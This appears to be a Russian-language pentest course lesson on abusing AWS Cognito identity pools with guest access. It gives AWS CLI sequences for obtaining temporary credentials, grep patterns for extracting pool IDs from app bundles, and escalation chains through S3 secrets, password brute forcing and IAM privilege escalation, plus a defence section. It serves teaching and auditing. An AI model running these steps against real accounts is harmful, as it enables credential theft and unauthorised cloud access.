---
id: cloud-aws-cognito
title: "Cognito: user pool, identity pool и кража временных кредов"
category: cloud
parent: cloud-aws-deep
difficulty: hard
order: 2
tags: [cloud, aws, cognito, identity-pool, user-pool, sts, credentials]
prerequisites: [cloud-aws-deep, cloud-iam-basics]
useful_for:
  - "Получение первых AWS-креденшелов без аутентификации"
  - "Пентест мобильных и SPA-приложений на AWS"
  - "Bug bounty: Cognito misconfig"
estimated_minutes: 50
summary: "Как устроены Cognito user pool и identity pool, чем опасен неаутентифицированный guest-доступ и как из публичного identity pool получить временные AWS-креды и роль."
---

## Зачем этот урок

Amazon Cognito — сервис идентичности AWS для мобильных и веб-приложений. Он встречается почти в каждом AWS-проекте с пользователями: SPA, мобильное приложение, IoT. И почти всегда рядом с ним — **identity pool**, который выдаёт временные AWS-креды (через STS). Если identity pool разрешает **guest-доступ** (unauthenticated identities), то любой, кто знает `IdentityPoolId`, получает `AWS_ACCESS_KEY_ID` и `AWS_SECRET_ACCESS_KEY` — без логина и пароля. Это один из самых частых способов получить первый ключ в облачном аккаунте. В этом уроке — как найти Cognito, как определить, включён ли guest-доступ, и как из этого вырастить роль с реальными правами.

## Как устроен Cognito

Cognito состоит из двух независимых частей:

- **User pool** — хранилище пользователей (логин/пароль, MFA, атрибуты). Выдаёт **JWT** (ID token, access token, refresh token). Сам по себе AWS-прав не даёт.
- **Identity pool** — обмен идентичности на **временные AWS-креды** через `sts:AssumeRoleWithWebIdentity`. Принимает либо JWT из user pool, либо токены внешних IdP (Google, Apple, Facebook), либо **неаутентифицированную** идентичность (guest).

Именно identity pool — цель атакующего, потому что он мостик из «приложение» в «AWS API». У identity pool есть две роли: `authenticated role` и `unauthenticated role`. Права ролей заданы в IAM trust policy с условием `cognito-identity.amazonaws.com:aud` (identity pool id) и опционально `:amr`.

Идентификатор identity pool выглядит так: `us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`. Он часто зашит в JS-бандл или в `strings` мобильного APK/IPA.

## Инструменты и команды

Основной инструмент — AWS CLI (или `boto3`). Для получения кредов нужны две операции:

```bash
# 1. Получить identity id (guest, без токена)
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:12345678-1234-1234-1234-1234567890ab" \
  --region us-east-1
# => {"IdentityId": "us-east-1:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"}

# 2. Обменять identity id на временные AWS-креды
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee" \
  --region us-east-1
# => {"Credentials": {"AccessKeyId": "...", "SecretKey": "...",
#      "SessionToken": "...", "Expiration": ...}, "IdentityId": "..."}
```

Полезные вспомогательные команды:

```bash
# Список identity pools в аккаунте (если есть права cognito-identity:ListIdentityPools)
aws cognito-identity list-identity-pools --max-results 60

# Описание пула: есть ли AllowUnauthenticatedIdentities
aws cognito-identity describe-identity-pool \
  --identity-pool-id "us-east-1:12345678-..." \
  --query 'AllowUnauthenticatedIdentities'

# Список user pool (если есть cognito-idp права)
aws cognito-idp list-user-pools --max-results 60
aws cognito-idp describe-user-pool --user-pool-id us-east-1_XXXXXXXXX
```

Для поиска идентификаторов в артефактах:

```bash
# В JS-бандле
grep -Eo '[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}' bundle.js | sort -u
# В APK
apktool d app.apk -o app_dec && grep -rEo 'us-east-1:[0-9a-f-]{36}' app_dec | sort -u
```

После получения кредов фиксируем их в окружении и проверяем, кто мы:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
# => {"UserId":"AROA...:CognitoIdentityCredentials","Account":"123456789012",
#     "Arn":"arn:aws:sts::123456789012:assumed-role/Cognito_AppUnauth_Role/CognitoIdentityCredentials"}
```

## Разобранный пример: от identity ID к кредам

Сценарий: в JS-бандле SPA найден `IdentityPoolId`. Проверяем guest-доступ.

Шаг 1 — `get-id`. Если guest выключен, вернётся ошибка `NotAuthorizedException`; если включён — `IdentityId`.

```bash
aws cognito-identity get-id --identity-pool-id "us-east-1:12345678-1234-1234-1234-1234567890ab" --region us-east-1
{"IdentityId": "us-east-1:9f8e7d6c-5b4a-3210-fedc-ba9876543210"}
```

Шаг 2 — `get-credentials-for-identity`. Получаем тройку ключей:

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:9f8e7d6c-5b4a-3210-fedc-ba9876543210" \
  --region us-east-1
```

Шаг 3 — `get-caller-identity` показывает assumed-role. Роль обычно называется `Cognito_<PoolName>Unauth_Role`.

Шаг 4 — разведка прав роли. Не перебирайте API вслепую, используйте инструмент:

```bash
# enumerate-iam перебирает действия и печатает разрешённые
python3 enumerate-iam.py --access-key ASIA... --secret-key ... --session-token ...
# Или pacu: import_keys затем whoami
```

Шаг 5 — эксплуатация. Частые находки в unauthenticated-ролях: доступ к S3-бакетам (чтение логов, статики, бэкапов), к DynamoDB-таблицам, к `cognito-identity:GetOpenIdToken` для других пулов (эскалация в authenticated-роль через трюк с `amr`). Если у роли есть `s3:ListBucket`/`s3:GetObject`, читаем содержимое и ищем секреты и конфиги:

```bash
aws s3 ls
aws s3 cp s3://target-configs/prod.env - | head -40
```

Частая цепочка: unauth-роль даёт чтение S3, где лежит `.env` с `AWS_ACCESS_KEY_ID` сервисного пользователя; этот пользователь уже имеет `iam:CreatePolicyVersion` → полная эскалация.

## Варианты атак и обходы

- **Guest → authenticated escalation.** Если identity pool разрешает guest, но у unauthenticated-роли есть право `cognito-identity:GetOpenIdTokenForDeveloperIdentity` или доверие по `amr` не проверяется, можно подделать `amr`, чтобы получить authenticated-роль. Проверяйте trust policy роли: отсутствие условия `ForAnyValue:StringLike cognito-identity.amazonaws.com:amr` — красный флаг.
- **Refresh token abuse.** Если утёк refresh token user pool, можно бесконечно обновлять access/ID token и обменивать их на креды authenticated-роли.
- **Developer provider misconfig.** `GetOpenIdTokenForDeveloperIdentity` с developer provider позволяет выпускать токены по произвольному `LoginToken` — если условие доверия слабое, это прямой вход.
- **Weak password policy.** User pool без политики сложности → перебор паролей через `InitiateAuth`/`AdminInitiateAuth` (осторожно: это онлайн-перебор, ограничивайте набор дефолтами).
- **Attribute injection.** Пользовательские атрибуты, попадающие в IAM-условия, можно попытаться подделать, если они writable.

## Частые ошибки и подводные камни

- **Путать user pool и identity pool.** JWT из user pool сам по себе AWS-прав не даёт; нужен обмен через identity pool.
- **Забывать про регион.** `get-id` и `get-credentials-for-identity` должны идти в регион пула, иначе `ResourceNotFoundException`.
- **Считать guest-доступ безобидным.** «Unauth роль только для чтения» часто читает весь S3-бакет компании.
- **Игнорировать срок жизни кредов.** Временные креды истекают (обычно 1 час); для длительной работы их нужно обновлять, повторяя `get-credentials-for-identity`.
- **Не проверять `get-caller-identity`.** Без него легко перепутать роль и записать неверную находку.
- **Перебирать API вслепую.** `enumerate-iam` быстрее и тише, чем десятки пробных вызовов.

## Защита и детект

- **Выключайте `AllowUnauthenticatedIdentities`**, если приложению не нужен гостевой доступ. Это главная мера.
- **Минимальные права обеих ролей.** Unauthenticated-роль не должна читать S3/бакеты с конфигами; authenticated — не должна иметь IAM-права.
- **Проверяйте `amr` в trust policy**, чтобы guest-токен не мог получить authenticated-роль.
- **Детект.** CloudTrail пишет `GetId` и `GetCredentialsForIdentity` (события уровня данных для Cognito не всегда, но STS-вызовы видны). GuardDuty имеет finding `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` для кредов из metadata; для Cognito ориентируйтесь на аномальные `assumed-role/Cognito_...Unauth_Role` в CloudTrail и на всплеск `GetCredentialsForIdentity` с новых IP.
- **Мониторинг.** Алерт на использование unauth-роли вне ожидаемых сервисов (например, вызовы IAM/S3 из `Cognito_...Unauth_Role`).

## Cognito в мобильных приложениях и SPA

В мобильных и одностраничных приложениях Cognito настраивается почти одинаково, но точки утечки различаются. В SPA весь конфиг (включая `IdentityPoolId`, `UserPoolId`, `ClientId`) лежит в JS-бандле, потому что браузерный SDK требует их на клиенте. Достаточно открыть DevTools, вкладку Sources, и поискать строки вида `us-east-1:`. Часто рядом лежит и `aws_cognito_identity_pool_id` из файла `aws-exports.js` (Amplify). В мобильных приложениях тот же конфиг попадает в ресурсы APK/IPA: `res/values/strings.xml`, `assets/`, `Info.plist`. Команды поиска:

```bash
# Amplify-конфиг в вебе
curl -s https://app.example.com/ | grep -Eo 'aws-exports[^"]*'
curl -s https://app.example.com/static/js/main.*.js | grep -Eo '[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}' | sort -u

# Мобильное приложение
unzip -o app.apk -d apk_x >/dev/null
grep -rEo 'us-east-1:[0-9a-f-]{36}' apk_x | sort -u
strings ios_app.ipa | grep -Eo 'us-east-1:[0-9a-f-]{36}' | sort -u
```

Важно: наличие `IdentityPoolId` ещё не означает guest-доступ. Проверка `AllowUnauthenticatedIdentities` — обязательный шаг, иначе вы просто получите `NotAuthorizedException`. Также обращайте внимание на **user pool client** без секрета (`GenerateSecret: false`) — такие клиенты позволяют вызывать `InitiateAuth` из публичного кода, что открывает онлайн-перебор паролей и регистрацию произвольных пользователей через `SignUp` (если self-registration включена). Регистрация своего пользователя в user pool часто даёт доступ к **authenticated** роли identity pool — то есть более широким правам, чем guest. Это цепочка «SignUp → логин → ID token → identity pool → authenticated креды», которая не требует ни одного чужого пароля.

## Продвинутые цепочки: от Cognito к админу

Cognito редко бывает конечной целью — это входной билет. Типовые продолжения:

1. **Cognito → S3 → static keys.** Unauth-роль читает бакет с конфигами; в `.env` лежат статические ключи сервисного пользователя. Проверяем `aws sts get-caller-identity` с ними — если это IAM-пользователь, у него может быть больше прав.
2. **Cognito → Lambda.** Если роль может `lambda:InvokeFunction`, а функция имеет более широкую роль, вызов с произвольным payload может вернуть данные или выполнить действие от имени функции (`cloud-lambda-privesc`).
3. **Cognito → DynamoDB.** Роль с `dynamodb:Scan` на таблицу пользователей даёт PII и хэши паролей; иногда там лежат токены сессий.
4. **Cognito → API Gateway.** ID/access token подходит для авторизаторов API Gateway (`cloud-api-gateway`); с валидным токеном открываются backend-методы, защищённые только JWT.
5. **Authenticated → AssumeRole.** Если authenticated-роль может `sts:AssumeRole` в другую роль с более широкими правами, цепочка ведёт к административному доступу (`cloud-assume-role`).

Практический совет: после получения кредов сразу запускайте `enumerate-iam` и параллельно стройте карту бакетов (`aws s3 ls`) — это самые быстрые источники дальнейшего продвижения.

## Сравнение Cognito с другими IdP

| Механизм | Что выдаёт | Типичная ошибка |
|----------|------------|-----------------|
| Cognito identity pool (guest) | Временные AWS-креды | `AllowUnauthenticatedIdentities: true` |
| Cognito identity pool (auth) | Временные AWS-креды | Слабое условие `amr` |
| Cognito user pool | JWT (ID/access/refresh) | Self-registration + широкие права |
| OIDC-федерация | Временные креды по `AssumeRoleWithWebIdentity` | Слабое условие `sub`/`aud` |
| SAML-федерация | Креды по `AssumeRoleWithSAML` | Широкий trust без условий |

Понимание этих различий важно, потому что защита у них разная: guest-доступ выключается одной настройкой, а OIDC-доверие требует аккуратного условия `sub`. В пентесте вы будете встречать все пять механизмов, и каждый даёт свой способ получить первый ключ.

## Что дальше / решение

Получив креды из Cognito, не останавливайтесь на «мы вошли». Следующий шаг — **разведка прав роли** (`enumerate-iam`), затем поиск цепочек эскалации (`cloud-privesc-iam`). Если роль читает S3 — ищите в бакетах `.env`, `terraform.tfstate`, ключи CI. Если роль может `sts:AssumeRole` — смотрите trust policy целевых ролей. Cognito часто открывает дверь в аккаунт, но ценность — в том, что за дверью. Записывайте цепочку как attack step: `Internet → Cognito guest → STS creds → S3 read → static keys → IAM privesc`.

## Квиз

```quiz
- question: "Что выдаёт identity pool атакующему при включённом guest-доступе?"
  options:
    - "Временные AWS-креды через STS"
    - "Пароль администратора"
    - "Root-доступ к аккаунту"
    - "Ключ шифрования KMS"
  answer: 0
  explanation: "Identity pool обменивает идентичность (в том числе неаутентифицированную) на временные креды AssumeRoleWithWebIdentity."
- question: "Как отличить user pool от identity pool по эффекту?"
  options:
    - "User pool выдаёт JWT, identity pool — временные AWS-креды"
    - "User pool выдаёт креды, identity pool — JWT"
    - "Оба выдают только cookies"
    - "Оба выдают root-доступ"
  answer: 0
  explanation: "User pool — про аутентификацию пользователей (JWT); identity pool — про обмен на AWS-креды."
- question: "Какой самый частый способ использовать Cognito для входа в AWS?"
  options:
    - "Включённый AllowUnauthenticatedIdentities"
    - "Отключённый CloudTrail"
    - "Публичный S3-бакет"
    - "Открытый порт 22"
  answer: 0
  explanation: "Guest-доступ позволяет получить креды без логина."
- question: "Что нужно проверить в trust policy роли identity pool, чтобы не допустить guest→authenticated?"
  options:
    - "Условие на amr (способ аутентификации)"
    - "Только регион"
    - "Только имя роли"
    - "Только тег"
  answer: 0
  explanation: "Без условия amr guest-токен может получить authenticated-роль."
```

## Где пригодится

- **Пентест AWS:** получение первых кредов из мобильного/веб-приложения.
- **Bug bounty:** Cognito-мисконфиги — частый класс находок.
- **Red team:** входной билет в аккаунт без фишинга.
- **Blue team:** аудит identity pools и прав ролей.
